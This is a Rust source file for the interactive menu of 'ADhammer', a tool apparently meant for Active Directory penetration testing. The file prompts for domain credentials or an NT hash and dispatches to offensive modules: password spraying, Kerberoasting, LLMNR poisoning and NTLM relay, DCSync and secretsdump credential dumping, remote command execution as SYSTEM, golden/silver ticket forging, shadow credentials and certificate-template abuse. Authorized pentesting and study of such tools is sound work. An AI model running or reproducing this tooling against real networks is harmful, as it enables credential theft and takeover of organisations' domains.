//! Interactive mode: `adhammer` prompts for domain creds, saves session, attack menu.
//! Reuse saved session with `adhammer --old`.

use anyhow::{Context, Result};
use dialoguer::{theme::ColorfulTheme, Confirm, Input, Password, Select};

use crate::session::{self, Session};
use crate::{
    abuse, adcsenum, asktgt, badsuccessor, coerce, dcshadow, dcsync, dnsenum, esc1, esc4,
    esc_registry_scan, exec_cmd, gmsa, golden, laps, lsa, netenum, poison, posture_scan, pth, rbcd,
    relay, roast, samr, scan, secretsdump, sessions, shadowcred, silver, spray, unconstrained,
    winrm_exec, wmiexec_cmd, zerologon, AbuseAction, AbuseArgs, AsktgtArgs, BadsuccessorArgs,
    CoerceArgs, CoercePipe, DcsyncArgs, DnsArgs, Esc1Args, Esc4Args, EscArgs, ExecArgs, GmsaArgs,
    GoldenArgs, LapsArgs, LsaArgs, NetArgs, PostureArgs, PthArgs, RbcdArgs, RelayArgs, RelayTarget,
    SamrArgs, SecretsdumpArgs, SessionsArgs, ShadowcredArgs, SilverArgs, SprayArgs, WinrmArgs,
    ZerologonArgs,
};

/// Default Domain-Admin group RID set embedded in forged tickets.
const DA_GROUPS: &[u32] = &[513, 512, 520, 518, 519];

enum Action {
    Scan,
    Guided,
    Roast,
    Spray,
    EnumSamr,
    EnumLsa,
    NetSweep,
    DnsEnum,
    AdcsEnum,
    EnumEsc,
    EnumPosture,
    Abuse,
    Coerce,
    Zerologon,
    Rbcd,
    Dcsync,
    Capture,
    Poison,
    Relay,
    Exec,
    Wmiexec,
    Winrm,
    Secretsdump,
    Gmsa,
    Laps,
    Esc1,
    Asktgt,
    Golden,
    Silver,
    Pth,
    EnumSessions,
    Unconstrained,
    Shadowcred,
    Esc4,
    Badsuccessor,
    Dcshadow,
    Constrained,
    ShowRoadmap,
    WipeSession,
    Exit,
}

const MENU: &[(&str, Action)] = &[
    ("Scan — passive audit (41 checks + graph)", Action::Scan),
    (
        "Guided — scan → confirm each weakness → validate + PoC report",
        Action::Guided,
    ),
    ("Roast — Kerberoast + AS-REP", Action::Roast),
    ("Spray — password spray", Action::Spray),
    ("Enum SAMR — list domain users", Action::EnumSamr),
    ("Enum LSA — name to SID", Action::EnumLsa),
    ("Net — network sweep", Action::NetSweep),
    ("DNS — enumerate ADIDNS zones/records", Action::DnsEnum),
    (
        "AD CS — enumerate CAs + ESC8 web-enrollment check",
        Action::AdcsEnum,
    ),
    (
        "ESC (registry) — ESC6/7/10/11/16 over MS-RRP",
        Action::EnumEsc,
    ),
    (
        "Posture — LDAP signing / channel binding + Spooler (relay enablers)",
        Action::EnumPosture,
    ),
    ("Abuse — LDAP write (SPN / keycred / RBCD …)", Action::Abuse),
    ("Coerce — PetitPotam / PrinterBug", Action::Coerce),
    (
        "Zerologon — CVE-2020-1472 SAFE detection (no reset)",
        Action::Zerologon,
    ),
    ("RBCD — impersonation chain", Action::Rbcd),
    ("DCSync — replicate secrets", Action::Dcsync),
    ("Capture — NTLM listener", Action::Capture),
    ("Poison — LLMNR / NBT-NS", Action::Poison),
    ("Relay — NTLM → LDAP shadow cred", Action::Relay),
    (
        "Exec — SVCCTL command as LocalSystem (psexec)",
        Action::Exec,
    ),
    (
        "WMIexec — DCOM Win32_Process.Create (output over C$)",
        Action::Wmiexec,
    ),
    ("WinRM — run a command over WS-Man (5985)", Action::Winrm),
    (
        "Secretsdump — local SAM hashes (reg save + C$)",
        Action::Secretsdump,
    ),
    ("gMSA — read managed password → NT hash", Action::Gmsa),
    ("LAPS — read local-admin passwords", Action::Laps),
    ("ESC1 — AD CS cert enroll (spoofed UPN SAN)", Action::Esc1),
    ("AskTGT — password → Kerberos ccache", Action::Asktgt),
    ("Golden — forge a TGT (krbtgt key)", Action::Golden),
    (
        "Silver — forge a service ticket (service key)",
        Action::Silver,
    ),
    (
        "Pass-the-ticket — forge → Kerberos SMB → run as SYSTEM",
        Action::Pth,
    ),
    (
        "Enum sessions — SRVSVC NetrSessionEnum (session hunting)",
        Action::EnumSessions,
    ),
    (
        "Unconstrained delegation — list TRUSTED_FOR_DELEGATION hosts",
        Action::Unconstrained,
    ),
    (
        "Shadow Credentials — plant KeyCredentialLink (+ PKINIT chain)",
        Action::Shadowcred,
    ),
    (
        "ESC4 — flip a cert template's flags → ESC1-vulnerable",
        Action::Esc4,
    ),
    (
        "BadSuccessor (2025) — dMSA that succeeds a Domain Admin",
        Action::Badsuccessor,
    ),
    (
        "DCShadow — enumerate accounts holding DCSync rights",
        Action::Dcshadow,
    ),
    (
        "Constrained delegation — S4U2Self+S4U2Proxy via AllowedToDelegateTo",
        Action::Constrained,
    ),
    (
        "Show open vectors (VECTORS.md summary)",
        Action::ShowRoadmap,
    ),
    (
        "Wipe saved session (delete creds from disk)",
        Action::WipeSession,
    ),
    ("Exit", Action::Exit),
];

/// Colored boxed banner + session line shown above the interactive menu.
fn banner(sess: &session::Session) {
    use crate::ui;
    let title = "ADHAMMER · Active Directory audit + validation";
    let rule = "─".repeat(title.chars().count() + 2);
    println!();
    println!("  {}", ui::accent(&format!("╭{rule}╮")));
    println!("  {}", ui::accent(&format!("│ {title} │")));
    println!("  {}", ui::accent(&format!("╰{rule}╯")));
    println!(
        "  {} {}    {} {}    {} {}",
        ui::dim("domain"),
        ui::green(&sess.domain),
        ui::dim("dc"),
        ui::green(&sess.dc),
        ui::dim("user"),
        ui::green(&sess.username),
    );
    println!();
}

pub async fn run(use_old: bool, no_save: bool) -> Result<()> {
    let reuse = use_old
        || (session::exists()
            && Confirm::new()
                .with_prompt("Saved session found — reuse it? (No = enter new credentials)")
                .default(true)
                .interact()?);
    let sess = if reuse {
        session::load()?
    } else {
        let s = setup_wizard()?;
        if no_save {
            eprintln!("[*] --no-save: session (creds) will NOT be written to disk");
        } else {
            session::save(&s)?;
        }
        s
    };

    let theme = ColorfulTheme::default();
    loop {
        banner(&sess);

        let labels: Vec<&str> = MENU.iter().map(|(l, _)| *l).collect();
        let idx = Select::with_theme(&theme)
            .with_prompt("Choose action")
            .items(&labels)
            .default(0)
            .interact()
            .context("menu cancelled")?;

        match &MENU[idx].1 {
            Action::Exit => break,
            Action::ShowRoadmap => {
                print_roadmap_summary();
                continue;
            }
            Action::WipeSession => {
                session::wipe().ok();
                continue;
            }
            action => {
                if let Err(e) = dispatch(action, &sess).await {
                    crate::ui::bad(&format!("{e:#}"));
                }
            }
        }
    }

    Ok(())
}

fn setup_wizard() -> Result<Session> {
    println!("=== ADhammer setup ===");
    println!("Enter the engagement target (saved for `adhammer --old`).\n");

    // 1. user  2. password | NT hash  3. domain  4. domain-controller IP  5. TLS.
    let username: String = Input::new()
        .with_prompt("User (test account / bind identity)")
        .with_initial_text("administrator")
        .interact_text()
        .context("username prompt")?;

    let auth = Select::new()
        .with_prompt("Authenticate with")
        .items(&["Password", "NT hash (pass-the-hash)"])
        .default(0)
        .interact()
        .context("auth prompt")?;
    let (password, nt_hash) = if auth == 0 {
        (Password::new().with_prompt("Password").interact()?, None)
    } else {
        let h: String = Input::new()
            .with_prompt("NT hash (32 hex)")
            .validate_with(|s: &String| match s.trim().len() {
                32 => Ok(()),
                n => Err(format!("expected 32 hex chars, got {n}")),
            })
            .interact_text()?;
        // A blank password is kept so Kerberos/DCSync actions can report they need one.
        (String::new(), Some(h.trim().to_string()))
    };

    let domain: String = Input::new()
        .with_prompt("Domain (DNS, e.g. corp.local)")
        .with_initial_text("corp.local")
        .interact_text()
        .context("domain prompt")?;

    let dc: String = Input::new()
        .with_prompt("Domain controller IP (or hostname)")
        .interact_text()
        .context("dc prompt")?;

    let insecure = Confirm::new()
        .with_prompt("Skip LDAPS certificate verification (lab DC)?")
        .default(true)
        .interact()
        .context("insecure prompt")?;

    Ok(Session {
        domain: domain.trim().to_string(),
        dc: dc.trim().to_string(),
        username: username.trim().to_string(),
        password,
        nt_hash,
        insecure,
    })
}

/// The session's NT hash as `Option<String>` for the pass-the-hash-capable actions.
fn sess_hash(s: &Session) -> Option<String> {
    s.nt_hash.clone()
}

async fn dispatch(action: &Action, s: &Session) -> Result<()> {
    match action {
        Action::Scan => scan(s.scan_args()).await,
        Action::Guided => {
            // Impact is a per-finding y/n prompt inside `guided()` now (not an up-front
            // choice) — so the operator sees each finding and decides whether they want
            // its attack-chain narrative before moving on.
            crate::guided::guided(crate::guided::GuidedArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
                host: Some(s.dc.clone()),
                domain: Some(s.netbios()),
                realm: Some(s.realm()),
                kdc: Some(s.dc.clone()),
                out: "adhammer-report.md".into(),
                yes: false,
                no_impact: false,
            })
            .await
        }
        Action::Roast => roast(s.scan_args()).await,
        Action::Spray => {
            let users: String = Input::new()
                .with_prompt("Users (@file or comma-separated)")
                .with_initial_text("@users.txt")
                .interact_text()?;
            let password: String = Password::new()
                .with_prompt("Password to spray")
                .interact()?;
            spray(SprayArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                users,
                password,
            })
            .await
        }
        Action::EnumSamr => {
            samr(SamrArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
            })
            .await
        }
        Action::EnumLsa => {
            let name: String = Input::new()
                .with_prompt("Account name to resolve")
                .with_initial_text("Administrator")
                .interact_text()?;
            lsa(LsaArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
                name,
            })
            .await
        }
        Action::NetSweep => {
            // Default to the DC's own /24 — accepting a hardcoded 10.0.0.0/24 on a real
            // engagement just sweeps an empty range and looks broken.
            let default_targets =
                s.dc.parse::<std::net::Ipv4Addr>()
                    .map(|ip| {
                        let o = ip.octets();
                        format!("{}.{}.{}.0/24", o[0], o[1], o[2])
                    })
                    .unwrap_or_else(|_| "10.0.0.0/24".to_string());
            let targets: String = Input::new()
                .with_prompt("Targets (CIDR, comma-list, or @file)")
                .with_initial_text(&default_targets)
                .interact_text()?;
            let deep = Confirm::new()
                .with_prompt(
                    "Deep checks (FTP·SMTP·DNS/AXFR·NFS·rsync·SNMP·RPC/EPM·WinRM·VNC·Redis)?",
                )
                .default(false)
                .interact()?;
            let zone = if deep {
                let z: String = Input::new()
                    .with_prompt("DNS zone for AXFR (blank to skip)")
                    .with_initial_text(&s.domain)
                    .allow_empty(true)
                    .interact_text()?;
                (!z.trim().is_empty()).then(|| z.trim().to_string())
            } else {
                None
            };
            netenum(NetArgs {
                targets,
                concurrency: 256,
                deep,
                zone,
                community: "public,private".to_string(),
            })
            .await
        }
        Action::DnsEnum => {
            dnsenum(DnsArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
            })
            .await
        }
        Action::AdcsEnum => {
            adcsenum(DnsArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
            })
            .await
        }
        Action::EnumEsc => {
            let ca: String = Input::new()
                .with_prompt("CA name (the Configuration\\<CA> key, e.g. corp-CA)")
                .interact_text()?;
            esc_registry_scan(EscArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                ca,
            })
            .await
        }
        Action::EnumPosture => {
            posture_scan(PostureArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
            })
            .await
        }
        Action::Zerologon => {
            let netbios: String = Input::new()
                .with_prompt("DC NetBIOS computer name (e.g. DC01)")
                .interact_text()?;
            // Interactive mode offers SAFE detection only — never the destructive exploit.
            zerologon(ZerologonArgs {
                host: s.dc.clone(),
                netbios,
                attempts: 2000,
                exploit: false,
                yes: false,
                confirm_brick_risk: false,
                domain: s.netbios(),
                restore: None,
                restore_password: None,
            })
            .await
        }
        Action::Abuse => {
            let actions = [
                AbuseAction::AddSpn,
                AbuseAction::AddMember,
                AbuseAction::SetPassword,
                AbuseAction::AddKeycred,
                AbuseAction::WriteRbcd,
                AbuseAction::Pkinit,
            ];
            let labels = [
                "add-spn",
                "add-member",
                "set-password",
                "add-keycred",
                "write-rbcd",
                "pkinit",
            ];
            let ai = Select::new()
                .with_prompt("Abuse action")
                .items(&labels)
                .default(0)
                .interact()?;
            let target: String = Input::new()
                .with_prompt("Target sAMAccountName")
                .interact_text()?;
            let value: String = Input::new()
                .with_prompt(
                    "Value (SPN / member / password / trustee SID — empty for pkinit key default)",
                )
                .allow_empty(true)
                .interact_text()?;
            abuse(AbuseArgs {
                url: Some(s.ldap_url()),
                user: Some(s.username.clone()),
                password: Some(s.password.clone()),
                insecure: s.insecure,
                action: actions[ai],
                target,
                value,
                realm: Some(s.domain.clone()),
                kdc: Some(s.dc.clone()),
                ldap389: false,
                host: Some(s.dc.clone()),
            })
            .await
        }
        Action::Coerce => {
            let listener: String = Input::new()
                .with_prompt("Listener IP (where DC should auth to)")
                .interact_text()?;
            let pipes = ["lsarpc (PetitPotam)", "efsrpc", "spoolss (PrinterBug)"];
            let pi = Select::new()
                .with_prompt("Coercion vector")
                .items(&pipes)
                .default(0)
                .interact()?;
            let pipe = match pi {
                1 => CoercePipe::Efsrpc,
                2 => CoercePipe::Spoolss,
                _ => CoercePipe::Lsarpc,
            };
            coerce(CoerceArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                listener,
                pipe,
                target: None,
            })
            .await
        }
        Action::Rbcd => {
            let account: String = Input::new()
                .with_prompt("Controlled account (RBCD trustee)")
                .interact_text()?;
            let account_password: String = Password::new()
                .with_prompt("Controlled account password")
                .interact()?;
            let impersonate: String = Input::new()
                .with_prompt("User to impersonate")
                .with_initial_text("Administrator")
                .interact_text()?;
            let target_spn: String = Input::new()
                .with_prompt("Target service SPN (e.g. cifs/dc.corp.local)")
                .interact_text()?;
            rbcd(RbcdArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                account,
                account_password,
                impersonate,
                target_spn,
            })
            .await
        }
        Action::Dcsync => {
            let all = Confirm::new()
                .with_prompt("Dump ALL domain accounts (full secretsdump)?")
                .default(false)
                .interact()?;
            let target: String = if all {
                String::new()
            } else {
                Input::new()
                    .with_prompt("Target account (empty = bind-only test)")
                    .allow_empty(true)
                    .interact_text()?
            };
            dcsync(DcsyncArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                target: if target.is_empty() {
                    None
                } else {
                    Some(target)
                },
                all,
                // Interactive-mode users just clicked "run" — treat it as explicit consent
                // rather than double-prompting them.
                yes: true,
                limit: None,
            })
            .await
        }
        Action::Capture => {
            let listen: String = Input::new()
                .with_prompt("Listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            smb2_client::server::capture(&listen)
                .await
                .map_err(Into::into)
        }
        Action::Poison => {
            let ip: String = Input::new()
                .with_prompt("Spoof IP (your capture listener)")
                .interact_text()?;
            let spoof_ip: std::net::Ipv4Addr = ip.parse().context("invalid IPv4")?;
            poison::poison(spoof_ip).await
        }
        Action::Relay => {
            let listen: String = Input::new()
                .with_prompt("SMB listen address")
                .with_initial_text("0.0.0.0:445")
                .interact_text()?;
            let target_object: String = Input::new()
                .with_prompt("Target object (sAMAccountName for shadow cred)")
                .interact_text()?;
            relay(RelayArgs {
                listen,
                target_dc: s.dc.clone(),
                realm: s.domain.clone(),
                target_object,
                target: RelayTarget::LdapKeycred,
                trustee_sid: None,
                ca_host: None,
                ca_template: "User".into(),
                ca_port: 443,
                ca_insecure: true,
            })
            .await
        }
        Action::Exec => {
            let command: String = Input::new()
                .with_prompt("Command to run as LocalSystem")
                .with_initial_text("whoami")
                .interact_text()?;
            exec_cmd(ExecArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Wmiexec => {
            let command: String = Input::new()
                .with_prompt("Command to run over WMI (Win32_Process.Create)")
                .with_initial_text("whoami")
                .interact_text()?;
            wmiexec_cmd(ExecArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Winrm => {
            let host: String = Input::new()
                .with_prompt("WinRM target host/IP")
                .with_initial_text(&s.dc)
                .interact_text()?;
            let command: String = Input::new()
                .with_prompt("Command to run (via cmd.exe /c)")
                .with_initial_text("whoami")
                .interact_text()?;
            winrm_exec(WinrmArgs {
                host,
                port: 5985,
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
                command,
            })
            .await
        }
        Action::Secretsdump => {
            secretsdump(SecretsdumpArgs {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: sess_hash(s),
            })
            .await
        }
        Action::Gmsa => {
            let target: String = Input::new()
                .with_prompt("gMSA sAMAccountName (e.g. gmsa_web$)")
                .interact_text()?;
            gmsa(GmsaArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
                target,
            })
            .await
        }
        Action::Laps => {
            let t: String = Input::new()
                .with_prompt("Computer sAMAccountName (blank = dump all readable)")
                .allow_empty(true)
                .interact_text()?;
            let target = (!t.trim().is_empty()).then(|| t.trim().to_string());
            laps(LapsArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: s.insecure,
                target,
            })
            .await
        }
        Action::Esc1 => {
            let ca: String = Input::new()
                .with_prompt("CA name (e.g. corp-CA)")
                .interact_text()?;
            let template: String = Input::new()
                .with_prompt("Template")
                .with_initial_text("User")
                .interact_text()?;
            let upn: String = Input::new()
                .with_prompt("UPN to impersonate via SAN")
                .with_initial_text(format!("Administrator@{}", s.domain))
                .interact_text()?;
            let pkinit = Confirm::new()
                .with_prompt("Chain enroll → cert → PKINIT (TGT)?")
                .default(false)
                .interact()?;
            esc1(Esc1Args {
                host: s.dc.clone(),
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                ca,
                template,
                upn,
                out: std::env::temp_dir()
                    .join("adh_esc1.crt")
                    .to_string_lossy()
                    .into_owned(),
                pkinit,
                kdc: Some(s.dc.clone()),
            })
            .await
        }
        Action::Asktgt => {
            let out: String = Input::new()
                .with_prompt("ccache output path")
                .with_initial_text(format!("{}.ccache", s.username))
                .interact_text()?;
            // Password auth → AES256; hash-only session → overpass-the-hash (RC4).
            let (password, nt_hash) = if s.password.is_empty() {
                (None, sess_hash(s))
            } else {
                (Some(s.password.clone()), None)
            };
            asktgt(AsktgtArgs {
                user: s.username.clone(),
                realm: s.realm(),
                kdc: s.dc.clone(),
                password,
                nt_hash,
                out: Some(out),
            })
            .await
        }
        Action::Golden => {
            let (krbtgt_aes256, domain_sid) =
                fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
            let (user, rid) = prompt_impersonation()?;
            let verify_spn: String = Input::new()
                .with_prompt("Verify against SPN (empty = skip KDC check)")
                .with_initial_text(format!("cifs/{}", s.dc))
                .allow_empty(true)
                .interact_text()?;
            let out: String = Input::new()
                .with_prompt("ccache output path (empty = don't save)")
                .allow_empty(true)
                .interact_text()?;
            golden(GoldenArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                krbtgt_aes256,
                domain_sid,
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                out: (!out.is_empty()).then_some(out),
                verify_spn: (!verify_spn.is_empty()).then_some(verify_spn),
            })
            .await
        }
        Action::Silver => {
            let account: String = Input::new()
                .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
                .interact_text()?;
            let (service_aes256, domain_sid) =
                fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
            let spn: String = Input::new()
                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                .with_initial_text(format!("cifs/{}", s.dc))
                .interact_text()?;
            let (user, rid) = prompt_impersonation()?;
            let out: String = Input::new()
                .with_prompt("ccache output path (empty = don't save)")
                .allow_empty(true)
                .interact_text()?;
            silver(SilverArgs {
                realm: s.realm(),
                service_aes256,
                spn,
                domain_sid,
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                out: (!out.is_empty()).then_some(out),
            })
            .await
        }
        Action::Pth => {
            let golden_mode = Select::new()
                .with_prompt("Ticket type")
                .items(&[
                    "Golden (krbtgt key, via KDC)",
                    "Silver (service key, no KDC)",
                ])
                .default(0)
                .interact()?
                == 0;
            let (krbtgt_aes256, service_aes256, domain_sid) = if golden_mode {
                let (k, sid) = fetch_key_and_sid(s, "krbtgt", "krbtgt AES256 key (64 hex)").await?;
                (Some(k), None, sid)
            } else {
                let account: String = Input::new()
                    .with_prompt("Service/machine account whose key to use (e.g. DC01$)")
                    .interact_text()?;
                let (k, sid) =
                    fetch_key_and_sid(s, &account, "service account AES256 key (64 hex)").await?;
                (None, Some(k), sid)
            };
            let (user, rid) = prompt_impersonation()?;
            let spn: String = Input::new()
                .with_prompt("Target SPN")
                .with_initial_text(format!("cifs/{}", s.dc))
                .interact_text()?;
            let command: String = Input::new()
                .with_prompt("Command to run (empty = just prove access)")
                .with_initial_text("whoami")
                .allow_empty(true)
                .interact_text()?;
            pth(PthArgs {
                host: s.dc.clone(),
                kdc: Some(s.dc.clone()),
                realm: s.realm(),
                domain_sid,
                krbtgt_aes256,
                service_aes256,
                spn: Some(spn),
                user,
                rid,
                groups: DA_GROUPS.to_vec(),
                rc4: false,
                command: (!command.is_empty()).then_some(command),
            })
            .await
        }
        Action::EnumSessions => {
            let host: String = Input::new()
                .with_prompt("Host to enumerate sessions on")
                .with_initial_text(&s.dc)
                .interact_text()?;
            sessions(SessionsArgs {
                host,
                domain: s.netbios(),
                user: s.username.clone(),
                password: s.password.clone(),
                nt_hash: s.nt_hash.clone(),
                include_machine: false,
            })
            .await
        }
        Action::Unconstrained => unconstrained(s.scan_args()).await,
        Action::Dcshadow => {
            // Interactive menu currently only exposes the detector — not prep/cleanup, which
            // require an extra --dc-name arg the setup wizard doesn't collect.
            dcshadow(crate::DcshadowArgs {
                scan: s.scan_args(),
                prep: None,
                cleanup: None,
                site: "Default-First-Site-Name".to_string(),
            })
            .await
        }
        Action::Shadowcred => {
            let target: String = Input::new()
                .with_prompt("Target sAMAccountName (plant KeyCredentialLink)")
                .interact_text()?;
            let pkinit = Confirm::new()
                .with_prompt("Also do PKINIT to get a TGT as the target?")
                .default(true)
                .interact()?;
            shadowcred(ShadowcredArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: true,
                target,
                pkinit,
                kdc: if pkinit { Some(s.dc.clone()) } else { None },
                realm: if pkinit { Some(s.realm()) } else { None },
            })
            .await
        }
        Action::Esc4 => {
            let template: String = Input::new()
                .with_prompt("Certificate template to weaponize (cn, e.g. User)")
                .with_initial_text("User")
                .interact_text()?;
            esc4(Esc4Args {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: true,
                template,
                enrollee: None,
            })
            .await
        }
        Action::Badsuccessor => {
            let target: String = Input::new()
                .with_prompt("Victim sAMAccountName to succeed (usually a Domain Admin)")
                .interact_text()?;
            let dmsa_name: String = Input::new()
                .with_prompt("New dMSA name (no `$` suffix — appended automatically)")
                .interact_text()?;
            let container: String = Input::new()
                .with_prompt("Container DN (blank = default CN=Managed Service Accounts)")
                .allow_empty(true)
                .interact_text()?;
            badsuccessor(BadsuccessorArgs {
                url: s.ldap_url(),
                user: s.username.clone(),
                password: s.password.clone(),
                insecure: true,
                container: if container.is_empty() {
                    None
                } else {
                    Some(container)
                },
                dmsa_name,
                target,
            })
            .await
        }
        Action::Constrained => {
            // Same S4U2Self+S4U2Proxy code path as RBCD; the difference is only intent.
            eprintln!("[*] Constrained delegation shares the RBCD chain — same prompts below.");
            let account: String = Input::new()
                .with_prompt("Controlled account (has msDS-AllowedToDelegateTo)")
                .interact_text()?;
            let account_password: String = Input::new()
                .with_prompt(format!("Password for {account}"))
                .interact_text()?;
            let impersonate: String = Input::new()
                .with_prompt("Identity to impersonate (e.g. Administrator)")
                .with_initial_text("Administrator")
                .interact_text()?;
            let target_spn: String = Input::new()
                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                .interact_text()?;
            rbcd(RbcdArgs {
                kdc: s.dc.clone(),
                realm: s.realm(),
                account,
                account_password,
                impersonate,
                target_spn,
            })
            .await
        }
        Action::ShowRoadmap | Action::WipeSession | Action::Exit => Ok(()),
    }
}

/// Auto-fetch `account`'s AES256 key (via DCSync) and the domain SID (via LSAT) using the
/// session's admin credentials — so golden/silver/pth need no manual paste. Falls back to manual
/// prompts if declined or if the account has no AES256 key.
async fn fetch_key_and_sid(
    s: &Session,
    account: &str,
    key_label: &str,
) -> Result<(String, String)> {
    // A hash-only session can't DCSync/LSAT-bind here, so go straight to manual entry.
    let auto = if s.password.is_empty() {
        false
    } else {
        Confirm::new()
            .with_prompt(format!(
                "Auto-fetch {account}'s AES256 key + domain SID via DCSync (uses your session creds)?"
            ))
            .default(true)
            .interact()
            .unwrap_or(false)
    };
    if !auto {
        return Ok((prompt_key(key_label)?, prompt_sid()?));
    }

    // Key via DCSync (DRSUAPI over sealed RPC).
    let mut drs = ms_drsr::DrsSession::bind(&s.dc, &s.netbios(), &s.username, &s.password).await?;
    let (_rid, _nt, kerb) = drs.dcsync(&s.netbios(), account).await?;
    let key = kerb
        .iter()
        .find(|k| k.etype_name() == "aes256-cts-hmac-sha1-96")
        .map(|k| hex::encode(&k.key))
        .context("account has no AES256 key in supplementalCredentials")?;

    // Domain SID via LSAT (resolve the account, drop the RID).
    let sid = lookup_domain_sid(s, account).await?;
    println!("[*] fetched {account} AES256 key + domain SID {sid}");
    Ok((key, sid))
}

/// Resolve `account` to a SID over LSAT and strip the RID to yield the domain SID string.
async fn lookup_domain_sid(s: &Session, account: &str) -> Result<String> {
    let mut smb = smb2_client::SmbClient::connect(&s.dc).await?;
    smb.login(&s.dc, &s.netbios(), &s.username, &s.password)
        .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", s.dc)).await?;
    let pipe = smb.open_pipe("lsarpc").await?;
    let mut c = dcerpc::lsat::LsatClient::bind(&mut smb, pipe).await?;
    let policy = c.open_policy().await?;
    let sid = c
        .lookup_name(&policy, account)
        .await?
        .context("LSAT could not resolve the account to a SID")?;
    let mut subs = sid.sub_authorities.clone();
    subs.pop(); // drop the RID → domain SID
    let domain = windows_sddl::Sid {
        revision: sid.revision,
        identifier_authority: sid.identifier_authority,
        sub_authorities: subs,
    };
    Ok(domain.to_string())
}

/// Prompt for a 64-hex AES256 key, trimming/validating length.
fn prompt_key(label: &str) -> Result<String> {
    let k: String = Input::new().with_prompt(label).interact_text()?;
    let k = k.trim().to_string();
    anyhow::ensure!(
        k.len() == 64,
        "expected a 64-hex AES256 key, got {} chars",
        k.len()
    );
    Ok(k)
}

fn prompt_sid() -> Result<String> {
    Ok(Input::<String>::new()
        .with_prompt("Domain SID (S-1-5-21-a-b-c)")
        .interact_text()?
        .trim()
        .to_string())
}

/// Impersonation identity: user + RID (defaults to Administrator / 500).
fn prompt_impersonation() -> Result<(String, u32)> {
    let user: String = Input::new()
        .with_prompt("Impersonate user")
        .with_initial_text("Administrator")
        .interact_text()?;
    let rid: u32 = Input::new()
        .with_prompt("RID")
        .with_initial_text("500")
        .interact_text()?;
    Ok((user, rid))
}

fn print_roadmap_summary() {
    println!();
    println!("=== Open vectors (summary) ===");
    println!("  Audit:  badSuccessor OU-ACL depth, ESC15/EKUwu, ESC5/6/7/10");
    println!("  Attack: pass-the-ticket, pass-the-hash, constrained delegation");
    println!("          GMSA/LAPS read, cert enrollment (ESC1/3 exploit)");
    println!("          ESC8/11 relay, SVCCTL/TSCH remote exec");
    println!("          full-domain DCSync, orchestrated coerce→relay→pkinit");
    println!("  Stack:  LDAP channel binding, GSSAPI bind (feature flag)");
    println!("          SVCCTL · TSCH · RRPM · NETLOGON · WINRM clients");
    println!();
    println!("  Full matrix: VECTORS.md in the repo root (or next to the binary source).");
    println!("  Suggested close order: PTT → ESC5/7 passive → constrained del → GMSA/LAPS → SVCCTL/TSCH → cert enroll");
}
